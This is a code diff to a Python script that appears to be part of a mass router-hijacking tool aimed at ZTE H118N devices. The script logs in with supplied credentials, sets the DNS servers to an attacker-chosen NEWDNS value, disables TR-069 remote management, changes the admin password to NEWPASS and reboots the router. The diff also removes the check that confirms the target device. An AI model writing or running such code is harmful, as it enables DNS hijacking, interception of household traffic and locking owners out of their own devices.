@@ -6,10 +6,9 @@ from time import sleep
 from shared import *
 
 def zte_H118N(target):
-    if (auth := parse_target(target)) is None:
-        return Status.WrongAuth
-
-    ip, username, password, status = auth
+    if isinstance(target, str):
+        if (target := parse_target(target)) is None:
+            return None
 
     s = requests.Session()
     s.hooks = { 'response': lambda r, *args, **kwargs: r.raise_for_status() }
@@ -19,12 +18,9 @@ def zte_H118N(target):
     })
 
     try:
-        res = s.get(f'http://{ip}', timeout=TIMEOUT)
+        res = s.get(f'http://{target.ip}', timeout=TIMEOUT)
     except RequestException:
         return Status.Inaccessible
-
-    if fingerprint(res) != 'ZXHN H118N /// Mini web server 1.0 ZTE corp 2005.':
-        return Status.WrongTarget
 
     matchtoken = re.search(r'getObj\("Frm_Logintoken"\).value = "(.*)";', res.text)
     if matchtoken is None:
@@ -33,10 +29,10 @@ def zte_H118N(target):
         logintoken = matchtoken.group(1)
 
     try:
-        s.post(f'http://{ip}/', {
+        s.post(f'http://{target.ip}/', {
             'action': 'login',
-            'Username': username,
-            'Password': password,
+            'Username': target.username,
+            'Password': target.password,
             'Frm_Logintoken': logintoken,
         }, timeout=TIMEOUT)
     except RequestException:
@@ -47,10 +43,10 @@ def zte_H118N(target):
 
     if '2008-2020 ZTE Co Ltd' in res.text:
         try:
-            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
+            s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
                 'DnsCMAPIEnabled': 'NULL',
                 'DomainName': 'NULL',
-                'SerIPAddress1': NEWDNS
+                'SerIPAddress1': NEWDNS,
                 'SerIPAddress2': '0.0.0.0',
                 'SerIPAddress3': 'NULL',
                 'SerIPAddress4': 'NULL',
@@ -66,7 +62,7 @@ def zte_H118N(target):
                 'IF_ERRORTYPE': '-1',
             }, timeout=TIMEOUT)
 
-            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=manager_user_conf_t.gch', {
+            s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=manager_user_conf_t.gch', {
                 'IF_ACTION': 'apply',
                 'IF_ERRORSTR': 'SUCC',
                 'IF_ERRORPARAM': 'SUCC',
@@ -74,11 +70,11 @@ def zte_H118N(target):
                 'IF_INDEX': '1',
                 'Type': 'NULL',
                 'Enable': 'NULL',
-                'Username': username,
-                'OldUsername': username,
+                'Username': target.username,
+                'OldUsername': target.username,
                 'Password': NEWPASS,
                 'Right': 'NULL',
-                'OldPassword': password,
+                'OldPassword': target.password,
             }, timeout=TIMEOUT)
 
         except RequestException:
@@ -86,7 +82,7 @@ def zte_H118N(target):
 
     else:
         try:
-             s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
+             s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
                 'Tr069Enable': '0',
                 'IF_ACTION': 'apply',
                 'IF_ERRORSTR': 'SUCC',
@@ -94,32 +90,32 @@ def zte_H118N(target):
                 'IF_ERRORTYPE': '-1',
             }, timeout=TIMEOUT)
 
-            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
-                'DNSServer1': NEWDNS,
-                'DNSServer2': '0.0.0.0',
-                'DNSServer3': '',
-                'DnsServerSource': '0',
-                'ISPDnsServerSource': 'NULL',
-                'IF_ACTION': 'apply',
-                'IF_ERRORSTR': 'SUCC',
-                'IF_ERRORPARAM': 'SUCC',
-                'IF_ERRORTYPE': '-1',
-            }, timeout=TIMEOUT)
+             s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
+                 'DNSServer1': NEWDNS,
+                 'DNSServer2': '0.0.0.0',
+                 'DNSServer3': '',
+                 'DnsServerSource': '0',
+                 'ISPDnsServerSource': 'NULL',
+                 'IF_ACTION': 'apply',
+                 'IF_ERRORSTR': 'SUCC',
+                 'IF_ERRORPARAM': 'SUCC',
+                 'IF_ERRORTYPE': '-1',
+             }, timeout=TIMEOUT)
 
-            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
-                'SerIPAddress1': NEWDNS,
-                'SerIPAddress2': '0.0.0.0',
-                'IF_ACTION': 'apply',
-                'IF_ERRORSTR': 'SUCC',
-                'IF_ERRORPARAM': 'SUCC',
-                'IF_ERRORTYPE': '-1',
-            }, timeout=TIMEOUT)
+             s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
+                 'SerIPAddress1': NEWDNS,
+                 'SerIPAddress2': '0.0.0.0',
+                 'IF_ACTION': 'apply',
+                 'IF_ERRORSTR': 'SUCC',
+                 'IF_ERRORPARAM': 'SUCC',
+                 'IF_ERRORTYPE': '-1',
+             }, timeout=TIMEOUT)
 
         except RequestException:
             return Status.PartialSuccess
 
     try:
-        s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch', {
+        s.post(f'http://{target.ip}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch', {
             'IF_ACTION': 'devrestart',
             'IF_ERRORSTR': 'SUCC',
             'IF_ERRORPARAM': 'SUCC',
